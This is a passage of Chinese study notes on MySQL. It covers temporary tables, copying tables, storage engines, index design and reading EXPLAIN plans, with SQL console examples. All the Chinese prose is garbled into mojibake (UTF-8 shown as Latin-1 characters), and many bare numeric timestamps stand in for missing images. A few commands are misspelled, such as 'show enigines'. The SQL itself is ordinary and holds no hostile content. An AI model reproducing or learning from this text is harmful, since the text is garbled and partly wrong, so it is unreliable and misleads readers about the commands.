æ³•ä½¿ç”¨MySQLçš„ä¸´æ—¶è¡¨ã€‚ä¸è¿‡ç°åœ¨ä¸€èˆ¬å¾ˆå°‘æœ‰å†ä½¿ç”¨è¿™ä¹ˆä½ç‰ˆæœ¬çš„MySQLæ•°æ®åº“æœåŠ¡äº†ã€‚ MySQLä¸´æ—¶è¡¨åªåœ¨å½“å‰è¿æ¥å¯è§ï¼Œå¦‚æœä½ ä½¿ç”¨PHPè„šæœ¬æ¥åˆ›å»ºMySQLä¸´æ—¶è¡¨ï¼Œé‚£æ¯å½“PHPè„šæœ¬æ‰§è¡Œå®Œæˆåï¼Œè¯¥ä¸´æ—¶è¡¨ä¹Ÿä¼šè‡ªåŠ¨é”€æ¯ã€‚ å¦‚æœä½ ä½¿ç”¨äº†å…¶ä»–MySQLå®¢æˆ·ç«¯ç¨‹åºè¿æ¥MySQLæ•°æ®åº“æœåŠ¡å™¨æ¥åˆ›å»ºä¸´æ—¶è¡¨ï¼Œé‚£ä¹ˆåªæœ‰åœ¨å…³é—­å®¢æˆ·ç«¯ç¨‹åºæ—¶æ‰ä¼šé”€æ¯ä¸´æ—¶è¡¨ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥æ‰‹åŠ¨é”€æ¯ã€‚ å®ä¾‹ä»¥ä¸‹å±•ç¤ºäº†ä½¿ç”¨MySQL ä¸´æ—¶è¡¨çš„ç®€å•å®ä¾‹ï¼Œä»¥ä¸‹çš„SQLä»£ç å¯ä»¥é€‚ç”¨äºPHPè„šæœ¬çš„mysql_query()å‡½æ•°ã€‚ mysql&gt; CREATE TEMPORARY TABLE SalesSummary ( -&gt; product_name VARCHAR(50) NOT NULL -&gt; , total_sales DECIMAL(12,2) NOT NULL DEFAULT 0.00 -&gt; , avg_unit_price DECIMAL(7,2) NOT NULL DEFAULT 0.00 -&gt; , total_units_sold INT UNSIGNED NOT NULL DEFAULT 0 ); Query OK, 0 rows affected (0.00 sec) mysql&gt; INSERT INTO SalesSummary -&gt; (product_name, total_sales, avg_unit_price, total_units_sold) -&gt; VALUES -&gt; (&#39;cucumber&#39;, 100.25, 90, 2); mysql&gt; SELECT * FROM SalesSummary; +--------------+-------------+----------------+------------------+ | product_name | total_sales | avg_unit_price | total_units_sold | +--------------+-------------+----------------+------------------+ | cucumber | 100.25 | 90.00 | 2 | +--------------+-------------+----------------+------------------+ 1 row in set (0.00 sec) å½“ä½ ä½¿ç”¨ SHOW TABLESå‘½ä»¤æ˜¾ç¤ºæ•°æ®è¡¨åˆ—è¡¨æ—¶ï¼Œä½ å°†æ— æ³•çœ‹åˆ° SalesSummaryè¡¨ã€‚ å¦‚æœä½ é€€å‡ºå½“å‰MySQLä¼šè¯ï¼Œå†ä½¿ç”¨ SELECTå‘½ä»¤æ¥è¯»å–åŸå…ˆåˆ›å»ºçš„ä¸´æ—¶è¡¨æ•°æ®ï¼Œé‚£ä½ ä¼šå‘ç°æ•°æ®åº“ä¸­æ²¡æœ‰è¯¥è¡¨çš„å­˜åœ¨ï¼Œå› ä¸ºåœ¨ä½ é€€å‡ºæ—¶è¯¥ä¸´æ—¶è¡¨å·²ç»è¢«é”€æ¯äº†ã€‚ åˆ é™¤MySQL ä¸´æ—¶è¡¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“ä½ æ–­å¼€ä¸æ•°æ®åº“çš„è¿æ¥åï¼Œä¸´æ—¶è¡¨å°±ä¼šè‡ªåŠ¨è¢«é”€æ¯ã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨å½“å‰MySQLä¼šè¯ä½¿ç”¨ DROP TABLE å‘½ä»¤æ¥æ‰‹åŠ¨åˆ é™¤ä¸´æ—¶è¡¨ã€‚ ä»¥ä¸‹æ˜¯æ‰‹åŠ¨åˆ é™¤ä¸´æ—¶è¡¨çš„å®ä¾‹ï¼š mysql&gt; CREATE TEMPORARY TABLE SalesSummary ( -&gt; product_name VARCHAR(50) NOT NULL -&gt; , total_sales DECIMAL(12,2) NOT NULL DEFAULT 0.00 -&gt; , avg_unit_price DECIMAL(7,2) NOT NULL DEFAULT 0.00 -&gt; , total_units_sold INT UNSIGNED NOT NULL DEFAULT 0 ); Query OK, 0 rows affected (0.00 sec) mysql&gt; INSERT INTO SalesSummary -&gt; (product_name, total_sales, avg_unit_price, total_units_sold) -&gt; VALUES -&gt; (&#39;cucumber&#39;, 100.25, 90, 2); mysql&gt; SELECT * FROM SalesSummary; +--------------+-------------+----------------+------------------+ | product_name | total_sales | avg_unit_price | total_units_sold | +--------------+-------------+----------------+------------------+ | cucumber | 100.25 | 90.00 | 2 | +--------------+-------------+----------------+------------------+ 1 row in set (0.00 sec) mysql&gt; DROP TABLE SalesSummary; mysql&gt; SELECT * FROM SalesSummary; ERROR 1146: Table &#39;RUNOOB.SalesSummary&#39; doesn&#39;t exist MySQL å¤åˆ¶è¡¨å¦‚æœæˆ‘ä»¬éœ€è¦å®Œå…¨çš„å¤åˆ¶MySQLçš„æ•°æ®è¡¨ï¼ŒåŒ…æ‹¬è¡¨çš„ç»“æ„ï¼Œç´¢å¼•ï¼Œé»˜è®¤å€¼ç­‰ã€‚ å¦‚æœä»…ä»…ä½¿ç”¨CREATE TABLE â€¦ SELECT å‘½ä»¤ï¼Œæ˜¯æ— æ³•å®ç°çš„ã€‚ æœ¬ç« èŠ‚å°†ä¸ºå¤§å®¶ä»‹ç»å¦‚ä½•å®Œæ•´çš„å¤åˆ¶MySQLæ•°æ®è¡¨ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š ä½¿ç”¨ SHOW CREATE TABLE å‘½ä»¤è·å–åˆ›å»ºæ•°æ®è¡¨(CREATE TABLE) è¯­å¥ï¼Œè¯¥è¯­å¥åŒ…å«äº†åŸæ•°æ®è¡¨çš„ç»“æ„ï¼Œç´¢å¼•ç­‰ã€‚ å¤åˆ¶ä»¥ä¸‹å‘½ä»¤æ˜¾ç¤ºçš„SQLè¯­å¥ï¼Œä¿®æ”¹æ•°æ®è¡¨åï¼Œå¹¶æ‰§è¡ŒSQLè¯­å¥ï¼Œé€šè¿‡ä»¥ä¸Šå‘½ä»¤ å°†å®Œå…¨çš„å¤åˆ¶æ•°æ®è¡¨ç»“æ„ã€‚ å¦‚æœä½ æƒ³å¤åˆ¶è¡¨çš„å†…å®¹ï¼Œä½ å°±å¯ä»¥ä½¿ç”¨ INSERT INTO â€¦ SELECT è¯­å¥æ¥å®ç°ã€‚ å®ä¾‹å°è¯•ä»¥ä¸‹å®ä¾‹æ¥å¤åˆ¶è¡¨ runoob_tbl ã€‚ æ­¥éª¤ä¸€ï¼š è·å–æ•°æ®è¡¨çš„å®Œæ•´ç»“æ„ã€‚ mysql&gt; SHOW CREATE TABLE runoob_tbl \\G; *************************** 1. row *************************** Table: runoob_tbl Create Table: CREATE TABLE `runoob_tbl` ( `runoob_id` int(11) NOT NULL auto_increment, `runoob_title` varchar(100) NOT NULL default &#39;&#39;, `runoob_author` varchar(40) NOT NULL default &#39;&#39;, `submission_date` date default NULL, PRIMARY KEY (`runoob_id`), UNIQUE KEY `AUTHOR_INDEX` (`runoob_author`) ) ENGINE=InnoDB 1 row in set (0.00 sec) ERROR: No query specified æ­¥éª¤äºŒï¼š ä¿®æ”¹SQLè¯­å¥çš„æ•°æ®è¡¨åï¼Œå¹¶æ‰§è¡ŒSQLè¯­å¥ã€‚ mysql&gt; CREATE TABLE `clone_tbl` ( -&gt; `runoob_id` int(11) NOT NULL auto_increment, -&gt; `runoob_title` varchar(100) NOT NULL default &#39;&#39;, -&gt; `runoob_author` varchar(40) NOT NULL default &#39;&#39;, -&gt; `submission_date` date default NULL, -&gt; PRIMARY KEY (`runoob_id`), -&gt; UNIQUE KEY `AUTHOR_INDEX` (`runoob_author`) -&gt; ) ENGINE=InnoDB; Query OK, 0 rows affected (1.80 sec) æ­¥éª¤ä¸‰ï¼š æ‰§è¡Œå®Œç¬¬äºŒæ­¥éª¤åï¼Œä½ å°†åœ¨æ•°æ®åº“ä¸­åˆ›å»ºæ–°çš„å…‹éš†è¡¨ clone_tblã€‚ å¦‚æœä½ æƒ³æ‹·è´æ•°æ®è¡¨çš„æ•°æ®ä½ å¯ä»¥ä½¿ç”¨ INSERT INTOâ€¦ SELECT è¯­å¥æ¥å®ç°ã€‚ mysql&gt; INSERT INTO clone_tbl (runoob_id, -&gt; runoob_title, -&gt; runoob_author, -&gt; submission_date) -&gt; SELECT runoob_id,runoob_title, -&gt; runoob_author,submission_date -&gt; FROM runoob_tbl; Query OK, 3 rows affected (0.07 sec) Records: 3 Duplicates: 0 Warnings: 0 æ‰§è¡Œä»¥ä¸Šæ­¥éª¤åï¼Œä½ å°†å®Œæ•´çš„å¤åˆ¶è¡¨ï¼ŒåŒ…æ‹¬è¡¨ç»“æ„åŠè¡¨æ•°æ®ã€‚ å¦ä¸€ç§å®Œæ•´å¤åˆ¶è¡¨çš„æ–¹æ³•:CREATE TABLE targetTable LIKE sourceTable; INSERT INTO targetTable SELECT * FROM sourceTable; å…¶ä»–: å¯ä»¥æ‹·è´ä¸€ä¸ªè¡¨ä¸­å…¶ä¸­çš„ä¸€äº›å­—æ®µ: CREATE TABLE newadmin AS ( SELECT username, password FROM admin ) å¯ä»¥å°†æ–°å»ºçš„è¡¨çš„å­—æ®µæ”¹å: CREATE TABLE newadmin AS ( SELECT id, username AS uname, password AS pass FROM admin ) å¯ä»¥æ‹·è´ä¸€éƒ¨åˆ†æ•°æ®: CREATE TABLE newadmin AS ( SELECT * FROM admin WHERE LEFT(username,1) = &#39;s&#39; ) å¯ä»¥åœ¨åˆ›å»ºè¡¨çš„åŒæ—¶å®šä¹‰è¡¨ä¸­çš„å­—æ®µä¿¡æ¯: CREATE TABLE newadmin ( id INTEGER NOT NULL AUTO_INCREMENT PRIMARY KEY ) AS ( SELECT * FROM admin ) åŒºåˆ†ä¸‹mysqlå¤åˆ¶è¡¨çš„ä¸¤ç§æ–¹å¼ã€‚ ç¬¬ä¸€ã€åªå¤åˆ¶è¡¨ç»“æ„åˆ°æ–°è¡¨ create table æ–°è¡¨ select * from æ—§è¡¨ where 1=2 æˆ–è€… create table æ–°è¡¨ like æ—§è¡¨ ç¬¬äºŒã€å¤åˆ¶è¡¨ç»“æ„åŠæ•°æ®åˆ°æ–°è¡¨ create tableæ–°è¡¨ select * from æ—§è¡¨ ä¸»è¦é…ç½®æ–‡ä»¶äºŒè¿›åˆ¶æ–‡ä»¶æ—¥å¿—log-binä¸»ä»å¤åˆ¶ é”™è¯¯æ—¥å¿—log-erroré»˜è®¤æ˜¯å…³é—­çš„,è®°å½•ä¸¥é‡çš„è­¦å‘Šå’Œé”™è¯¯ä¿¡æ¯,æ¯æ¬¡å¯åŠ¨å’Œå…³é—­çš„è¯¦ç»†ä¿¡æ¯ç­‰ æŸ¥è¯¢æ—¥å¿—logé»˜è®¤å…³é—­,è®°å½•æŸ¥è¯¢çš„sqlè¯­å¥,å¦‚æœå¼€å¯ä¼šå‡ä½mysqlçš„æ•´ä½“æ€§èƒ½,å› ä¸ºè®°å½•æ—¥å¿—ä¹Ÿæ˜¯éœ€è¦æ¶ˆè€—ç³»ç»Ÿèµ„æºçš„ æ•°æ®æ–‡ä»¶åº“é»˜è®¤è·¯å¾„: /var/lib/mysql 1595839986393 frmæ–‡ä»¶å­˜æ”¾è¡¨ç»“æ„ MYDæ–‡ä»¶å­˜æ”¾çš„æ˜¯æ•°æ®,DATA MYIæ–‡ä»¶å­˜æ”¾çš„æ˜¯æŸ¥æ‰¾æ•°æ®çš„ç´¢å¼•,INDEX é€»è¾‘ç»“æ„1595842885282 1595843892063 1595843971185 1595844045065 å­˜å‚¨å¼•æ“show enigines æŸ¥çœ‹mysqlå½“å‰é»˜è®¤çš„å­˜å‚¨å¼•æ“ show variable like &#39;%storage_engine%&#39; MyisAmå’ŒInnoDBåŒºåˆ«1595844384514 1595844849986 SQLæ‰§è¡ŒåŠ è½½é¡ºåºæ‰‹å†™ 1595988597583 æœºè¯» 1595988626819 ç´¢å¼• MYSQLå®˜æ–¹å¯¹ç´¢å¼•çš„å®šä¹‰ï¼šç´¢å¼•(Index)æ˜¯å¸®åŠ©MYSQLé«˜æ•ˆè·å–æ•°æ®çš„æ•°æ®ç»“æ„.å¯ä»¥å¾—åˆ°ç´¢å¼•çš„æœ¬è´¨:ç´¢å¼•å°±æ˜¯æ•°æ®ç»“æ„. â€œæ’å¥½åºçš„å¿«é€ŸæŸ¥æ‰¾æ•°æ®ç»“æ„â€ å¯¹æ’åºå’ŒæŸ¥æ‰¾éƒ½æœ‰å½±å“ åœ¨æ•°æ®ä¹‹å¤–,æ•°æ®åº“ç³»ç»Ÿè¿˜ç»´æŠ¤ç€æ»¡è¶³ç‰¹å®šæŸ¥æ‰¾ç®—æ³•çš„æ•°æ®ç»“æ„,è¿™äº›æ•°æ®ç»“æ„ä»¥æŸç§æ–¹å¼å¼•ç”¨(æŒ‡å‘)æ•°æ®. è¿™æ ·å¯ä»¥åœ¨è¿™äº›æ•°æ®ç»“æ„ä¸Šå®ç°é«˜çº§æŸ¥æ‰¾ç®—æ³•.è¿™ç§æ•°æ®ç»“æ„,å°±æ˜¯ç´¢å¼•.ä¸‹å›¾å°±æ˜¯ä¸€ç§å¯èƒ½çš„ç´¢å¼•æ–¹å¼ç¤ºä¾‹: 1595905536134 ç´¢å¼•çš„ç›®çš„åœ¨äºæé«˜æŸ¥æ‰¾æ•ˆç‡,å¯ä»¥ç±»æ¯”å­—å…¸; ä¸€èˆ¬æ¥è¯´ç´¢å¼•æœ¬èº«ä¹Ÿå¾ˆå¤§,ä¸å¯èƒ½å…¨éƒ¨å­˜å‚¨åœ¨å†…å­˜ä¸­,å› æ­¤ç´¢å¼•å¾€å¾€ä»¥ç´¢å¼•æ–‡ä»¶çš„å½¢å¼å­˜å‚¨çš„ç£ç›˜ä¸Š æˆ‘ä»¬å¹³å¸¸æ‰€è¯´çš„ç´¢å¼•,å¦‚æœæ²¡æœ‰ç‰¹åˆ«æŒ‡æ˜,éƒ½æ˜¯æŒ‡b+æ ‘(å¤šè·¯æœç´¢æ ‘,å¹¶ä¸ä¸€å®šæ˜¯äºŒå‰çš„)ç»“æ„ç»„ç»‡çš„ç´¢å¼•,å…¶ä¸­èšé›†ç´¢å¼•,æ¬¡è¦ç´¢å¼•,è¦†ç›–ç´¢å¼•,å¤åˆç´¢å¼•,å‰ç¼€ç´¢å¼•,å”¯ä¸€ç´¢å¼•é»˜è®¤éƒ½æ˜¯ä½¿ç”¨B+æ ‘ç´¢å¼•,ç»Ÿç§°ç´¢å¼•.å½“ç„¶,é™¤äº†B+æ ‘è¿™ç§ç±»å‹çš„ç´¢å¼•ä¹‹å¤–,è¿˜æœ‰å“ˆå¸Œç´¢å¼•(hash index)ç­‰ ç´¢å¼•ä¼˜åŠ¿ç±»ä¼¼å¤§å­¦å›¾ä¹¦é¦†å»ºä¹¦ç›®ç´¢å¼•,æé«˜æ•°æ®æ£€ç´¢çš„æ•ˆç‡,é™ä½æ•°æ®åº“çš„IOæˆæœ¬,é€šè¿‡ç´¢å¼•å¯¹æ•°æ®è¿›è¡Œæ’åº,é™ä½æ•°æ®æ’åºçš„æˆæœ¬,é™ä½äº†CPUçš„æ¶ˆè€—. åŠ£åŠ¿1595911864015 ç´¢å¼•çš„åˆ†ç±»å•å€¼ç´¢å¼•å³ä¸€ä¸ªç´¢å¼•åªåŒ…å«å•ä¸ªåˆ—ï¼Œä¸€ä¸ªè¡¨å¯ä»¥æœ‰å¤šä¸ªå•åˆ—ç´¢å¼• å”¯ä¸€ç´¢å¼•ç´¢å¼•åˆ—çš„å€¼å¿…é¡»å”¯ä¸€ï¼Œä½†å…è®¸æœ‰ç©ºå€¼ å¤åˆç´¢å¼•å³ä¸€ä¸ªç´¢å¼•åŒ…å«å¤šä¸ªåˆ— ç´¢å¼•çš„å‘½åè¯­å¥åˆ›å»º CREATE [UNIQUE] INDEX indexName ON mytable(columnname(length)); ALTER mytable ADD [UNIQUE] INDEX [indexName] ON (columnname(name)); 1595920057502 åˆ é™¤ DROP INDEX [indexName] ON mytable; æŸ¥çœ‹ SHOW INDEX FROM table_name\\G ä½¿ç”¨ALTERå‘½ä»¤ ç´¢å¼•ç»“æ„BTreeç´¢å¼• b+æ ‘ Hashç´¢å¼• full-textå…¨æ–‡ç´¢å¼• R-Treeç´¢å¼• å“ªäº›æƒ…å†µéœ€è¦åˆ›å»ºç´¢å¼•ï¼Ÿ ä¸»é”®è‡ªåŠ¨åˆ›å»ºç´¢å¼• é¢‘ç¹ä½œä¸ºæŸ¥è¯¢æ¡ä»¶çš„å­—æ®µåº”è¯¥åˆ›å»ºç´¢å¼• æŸ¥è¯¢ä¸­ä¸å…¶ä»–è¡¨å…³è”çš„å­—æ®µï¼Œå¤–é”®å…³ç³»å»ºç«‹ç´¢å¼• é¢‘ç¹æ›´æ–°çš„å­—æ®µä¸é€‚åˆåˆ›å»ºç´¢å¼•ï¼Œå› ä¸ºæ¯æ¬¡æ›´æ–°ä¸å•å•æ˜¯æ›´æ–°äº†è®°å½•è¿˜ä¼šæ›´æ–°ç´¢å¼• whereæ¡ä»¶é‡Œç”¨ä¸åˆ°çš„å­—æ®µä¸åˆ›å»ºç´¢å¼• å•é”®/ç»„åˆç´¢å¼•çš„é€‰æ‹©é—®é¢˜ï¼ˆåœ¨é«˜å¹¶å‘ä¸‹å€¾å‘åˆ›å»ºç»„åˆç´¢å¼•ï¼‰ æŸ¥è¯¢ä¸­æ’åºçš„å­—æ®µï¼Œæ’åºå­—æ®µè‹¥é€šè¿‡ç´¢å¼•å»è®¿é—®å°†å¤§å¤§æé«˜æ’åºé€Ÿåº¦ æŸ¥è¯¢ä¸­ç»Ÿè®¡æˆ–è€…åˆ†ç»„çš„å­—æ®µ å“ªäº›æƒ…å†µä¸éœ€è¦åˆ›å»ºç´¢å¼•ï¼Ÿ è¡¨è®°å½•å¤ªå°‘ ç»å¸¸å¢åˆ æ”¹çš„è¡¨ æé«˜äº†æŸ¥è¯¢é€Ÿåº¦ï¼ŒåŒæ—¶ä¼šé™ä½æ›´æ–°è¡¨çš„é€Ÿåº¦ï¼Œå¦‚å¯¹è¡¨è¿›è¡ŒINSERTã€UPDATEå’ŒDELETEã€‚ å› ä¸ºåœ¨æ›´æ–°è¡¨æ—¶ï¼ŒMYSQLä¸ä»…è¦ä¿å­˜æ•°æ®ï¼Œè¿˜è¦ä¿å­˜ä¸€äº›ç´¢å¼•æ–‡ä»¶ã€‚ æ•°æ®é‡å¤ä¸”åˆ†å¸ƒå‡åŒ€çš„è¡¨å­—æ®µï¼Œå› æ­¤åº”è¯¥åªä¸ºæœ€ç»å¸¸æŸ¥è¯¢å’Œæœ€ç»å¸¸æ’åºçš„æ•°æ®å»ºç«‹ç´¢å¼•ã€‚ å¦‚æœæŸä¸ªæ•°æ®åˆ—åŒ…å«è®¸å¤šé‡å¤å†…å®¹ï¼Œä¸ºå®ƒå»ºç«‹ç´¢å¼•å°±æ²¡æœ‰å¤ªå¤§çš„å®é™…æ•ˆæœã€‚ 1595923227254 æ€§èƒ½åˆ†æï¼ˆæŸ¥è¯¢æ‰§è¡Œè®¡åˆ’ï¼‰MYSQL QUERY Optimizer 1595923535216 MYSQLçš„å¸¸è§ç“¶é¢ˆ 1595923570837 Explain1595923735876 èƒ½å¹²å— è¡¨çš„è¯»å–é¡ºåº æ•°æ®è¯»å–æ“ä½œçš„æ“ä½œç±»å‹ å“ªäº›ç´¢å¼•å¯ä»¥ä½¿ç”¨ é‚£äº›ç´¢å¼•è¢«å®é™…ä½¿ç”¨ è¡¨ä¹‹é—´çš„å¼•ç”¨ æ¯å¼ è¡¨æœ‰å¤šå°‘è¡Œè¢«ä¼˜åŒ–å™¨æŸ¥è¯¢ ä½¿ç”¨ï¼šExplain + SQLè¯­å¥æ‰§è¡Œè®¡åˆ’åŒ…å«çš„ä¿¡æ¯ 1595927315197 è¡¨çš„è¯»å–é¡ºåºidï¼š selectæŸ¥è¯¢çš„åºåˆ—å·,åŒ…å«ä¸€ç»„æ•°å­—,è¡¨ç¤ºæŸ¥è¯¢ä¸­æ‰§è¡Œselectå­å¥æˆ–æ“ä½œè¡¨çš„é¡ºåº ä¸‰ç§æƒ…å†µ: idç›¸åŒ,æ‰§è¡Œé¡ºåºç”±ä¸Šè‡³ä¸‹ idä¸åŒ,å¦‚æœæ˜¯å­æŸ¥è¯¢,idçš„åºå·ä¼šé€’å¢,idå€¼è¶Šå¤§ä¼˜å…ˆçº§ä¼šè¶Šé«˜,è¶Šå…ˆè¢«æ‰§è¡Œ. 1595928872305 idç›¸åŒä¸åŒ,åŒæ—¶å­˜åœ¨ 1595929240606 deriveçš„2æŒ‡çš„æ˜¯idä¸º2çš„t3. æ•°æ®è¯»å–æ“ä½œçš„æ“ä½œç±»å‹select_typeï¼š1595987567416 1595987675026 tableï¼šæ˜¾ç¤ºè¿™ä¸€è¡Œæ•°æ®æ˜¯å…³äºå“ªå¼ è¡¨çš„ typeï¼šè®¿é—®ç±»å‹ 1596002301273 æ˜¾ç¤ºæŸ¥è¯¢ä½¿ç”¨äº†ä½•ç§ç±»å‹ï¼Œ ä»æœ€å¥½åˆ°æœ€å·®ä¾æ¬¡æ˜¯ï¼š system &gt; const &gt; eq_ref &gt; ref &gt; range &gt; index &gt;ALL 1596002552181 system 1596002626747 const 1596002709087 eq_ref 1596002859369 ref 1596003234330 range 1596006294816 index 1596006410428 ALL å…¨è¡¨æ‰«æ 1596006425805 1596006455254 possible_keys å’Œ keyï¼špossible_keysï¼š 1596006649311 keyï¼š 1596006751196 key_len:1596007145091 4(charé•¿åº¦)*3(UTF-8ï¼‰+1ï¼ˆnullï¼‰=13 ref:1596007454015 1596008615453 rows:1596008758503 extra:åŒ…å«ä¸é€‚åˆåœ¨å…¶ä»–åˆ—ä¸­æ˜¾ç¤ºä½†ååˆ†é‡è¦çš„é¢å¤–ä¿¡æ¯ Using filesort è¯´æ˜mysqlä¼šå¯¹æ•°æ®ä½¿ç”¨ä¸€ä¸ªå¤–éƒ¨çš„ç´¢å¼•æ’åº,è€Œä¸æ˜¯æŒ‰ç…§è¡¨å†…çš„ç´¢å¼•é¡ºåºè¿›è¡Œè¯»å–,MYSQLä¸­æ— æ³•åˆ©ç”¨ç´¢å¼•å®Œæˆçš„æ’åºæ“ä½œè¢«ç§°ä¸ºâ€æ–‡ä»¶æ’åºâ€ 1596010221763 Using temporary 1596010368374 1596010573507 Using index 1596011670611 è¦†ç›–ç´¢å¼•,åœ¨possible_keysæ²¡æœ‰å‡ºç°ä½†åœ¨keyå‡ºç° 1596011879046 è¦†ç›–ç´¢å¼•: Using where ä½¿ç”¨äº†whereè¿‡æ»¤ using join buffer ä½¿ç”¨äº†è¿æ¥ç¼“å­˜ impossiable where whereå­å¥çš„å€¼æ€»æ˜¯false,ä¸èƒ½ç”¨æ¥è·å–ä»»ä½•å…ƒç»„ select tables optimized away åœ¨æ²¡æœ‰GROUPBYå­å¥çš„æƒ…å†µä¸‹,åŸºäºç´¢å¼•ä¼˜åŒ–MIN/MAXæ“ä½œæˆ–è€…å¯¹äºMyISAMå­˜å‚¨å¼•æ“ä¼˜åŒ–COUNT(*)æ“ä½œä¸å¿…ç­‰åˆ°æ‰§è¡Œé˜¶æ®µå†è¿›è¡Œè®¡ç®—,æŸ¥è¯¢æ‰§è¡Œè®¡åˆ’ç”Ÿæˆçš„é˜¶æ®µå³å®Œæˆä¼˜åŒ–. distinct ä¼˜åŒ–distinctæ“ä½œï¼Œåœ¨æ‰¾åˆ°ç¬¬ä¸€åŒ¹é…çš„å…ƒç»„åå³åœæ­¢æ‰¾åŒæ ·å€¼çš„åŠ¨ä½œã€‚ 1596012711619 1596012728741 å•è¡¨ä¼˜åŒ–1596025975416 1596025918356 èŒƒå›´ä½¿ç´¢å¼•å¤±æ•ˆ 1596026094589 1596026161365 ä¸¤è¡¨ä¼˜åŒ–1596034217829 å…ˆå°è¯•åªæ·»åŠ å³è¡¨çš„ç´¢å¼• 1596034306983 1596034355686 å·¦è¡¨ 1596034657083 1596034707674 æ‰€ä»¥å·¦è¿æ¥è¦åŠ å³è¡¨ã€‚å·¦è¡¨å…¨æœ‰ï¼ŒåŠ ä¸åŠ ç´¢å¼•éƒ½æ˜¯å…¨è¡¨æŸ¥è¯¢ã€‚ä¸‰è¡¨ä¼˜åŒ–1596035555366 1596035651547 ç´¢å¼•ä¼˜åŒ–é¿å…ç´¢å¼•å¤±æ•ˆå»ºè¡¨ 1596090287752 1596090383772 å…¨å€¼åŒ¹é… 1596090596937 1596090698031 ç¬¬ä¸€å±‚ç´¢å¼•æ²¡ç”¨ä¸Šï¼Œæ¢¯å­æ–­è£‚ï¼Œæœ€ä½³å·¦å‰ç¼€åŸåˆ™ æœ€ä½³å·¦å‰ç¼€åŸåˆ™ å¦‚æœç´¢å¼•äº†å¤šåˆ—ï¼Œè¦éµå®ˆæœ€å·¦å‰ç¼€æ³•åˆ™ã€‚æŒ‡çš„æ˜¯æŸ¥è¯¢ä»ç´¢å¼•çš„æœ€å·¦å‰åˆ—å¼€å§‹å¹¶ä¸”ä¸è·³è¿‡ç´¢å¼•ä¸­çš„åˆ—ã€‚ ä¸åœ¨ç´¢å¼•åˆ—ä¸Šåšä»»ä½•æ“ä½œ å­˜å‚¨å¼•æ“ä¸èƒ½ä½¿ç”¨ç´¢å¼•ä¸­èŒƒå›´æ¡ä»¶å³è¾¹çš„åˆ— 1596091809527 èŒƒå›´åé¢çš„ç´¢å¼•å¤±æ•ˆ å°½é‡ä½¿ç”¨è¦†ç›–ç´¢å¼• 1596092067130 ä½¿ç”¨ä¸ç­‰äºï¼ˆ!=æˆ–è€…&lt;&gt;ï¼‰çš„æ—¶å€™æ— æ³•ä½¿ç”¨ç´¢å¼•ä¼šå¯¼è‡´å…¨è¡¨æ‰«æ is not,is not nullæ— æ³•ä½¿ç”¨ç´¢å¼• 1596092443607 likeä»¥é€šé…ç¬¦å¼€å¤´ä½¿ç´¢å¼•å¤±æ•ˆä¼šå˜æˆå…¨è¡¨æ‰«æ 1596092593809 è¦ä½¿ç”¨ä¸¤è¾¹éƒ½å¸¦æœ‰é€šé…ç¬¦ â€˜ %XX% â€˜ çš„è§£å†³æ–¹æ³•: åˆ›å»ºè¦†ç›–ç´¢å¼•; 1596093309432 å­—ç¬¦ä¸²ä¸åŠ å•å¼•å·ç´¢å¼•å¤±æ•ˆ å°‘ç”¨or,ç”¨å®ƒæ¥è¿æ¥æ—¶ç´¢å¼•å¤±æ•ˆ other: èŒƒå›´åç´¢å¼•æ–­å¼€,ä½¿ç”¨èŒƒå›´çš„å­—æ®µä¹Ÿéƒ¨åˆ†ä½¿ç”¨äº†ç´¢å¼•. ç”¨äºå­—æ®µæ’åºçš„ç´¢å¼•ä¸€å®šè¦æŒ‰ç…§å»ºç«‹ç´¢å¼•çš„å­—æ®µé¡ºåº.å¦åˆ™ä¼šäº§ç”Ÿfilesort. æ’åºä¹Ÿä¼šä½¿ç”¨ç´¢å¼•å¹¶ä¸”ä¸ä¼šæ–­å¼€,ä½†ä¸æ˜¾ç¤ºåœ¨refå­—æ®µä¸Š. 1596096019383 åˆ†ç»„ä¹‹å‰å¿…æ’åº,ä¼šæœ‰ä¸´æ—¶è¡¨äº§ç”Ÿ 1596096420658 1596098552860 æŸ¥è¯¢æˆªå–åˆ†ææŸ¥è¯¢ä¼˜åŒ– å°è¡¨é©±åŠ¨å¤§è¡¨ 1596113933906 â€œselect 1 fromâ€çš„1æ˜¯ä»€ä¹ˆéƒ½è¡Œ,æ˜¯ä¸ªå¸¸é‡å°±è¡Œ 1596114222051 in å’Œ exists 1596114728723 Order byå…³é”®å­—æ’åºä¼˜åŒ– order byå­å¥ï¼Œå°½é‡ä½¿ç”¨indexæ–¹å¼æ’åºï¼Œé¿å…ä½¿ç”¨filesortæ–¹å¼æ’åºï¼› 1596180644843 1596180875682 1596180941151 é»˜è®¤æ˜¯å‡åºã€‚è¦ä¸å°±å…¨éƒ¨å‡åº,è¦ä¸å°±å…¨éƒ¨é™åº å°½å¯èƒ½åœ¨ç´¢å¼•æ ‘ä¸Šå®Œæˆæ’åºæ“ä½œï¼Œéµç…§ç´¢å¼•å»ºçš„æœ€ä½³æœ€å‰ç¼€ å¦‚æœä¸åœ¨ç´¢å¼•åˆ—ä¸Šï¼Œfilesortæœ‰ä¸¤ç§ç®—æ³•: mysqlå°±è¦å¯åŠ¨åŒè·¯æ’åºå’Œå•è·¯æ’åºï¼› åŒè·¯æ’åºï¼šMYSQL4.1ä¹‹å‰æ˜¯ä½¿ç”¨åŒè·¯æ’åºï¼Œå­—é¢æ„æ€å°±æ˜¯ä¸¤æ¬¡æ‰«æç£ç›˜ï¼Œæœ€ç»ˆå¾—åˆ°æ•°æ®ï¼Œè¯»å–è¡ŒæŒ‡é’ˆå’Œorderbyåˆ—ï¼Œå¯¹ä»–ä»¬è¿›è¡Œæ’åºï¼Œç„¶åæ‰«æå·²ç»æ’åºå¥½çš„åˆ—è¡¨ï¼ŒæŒ‰ç…§åˆ—è¡¨ä¸­çš„å€¼é‡æ–°ä»åˆ—è¡¨ä¸­è¯»å–å¯¹åº”çš„æ•°æ®è¾“å‡ºã€‚ ä»ç£ç›˜å–æ’åºå­—æ®µï¼Œåœ¨bufferè¿›è¡Œæ’åºï¼Œå†ä»ç£ç›˜å–å…¶ä»–å­—æ®µã€‚ 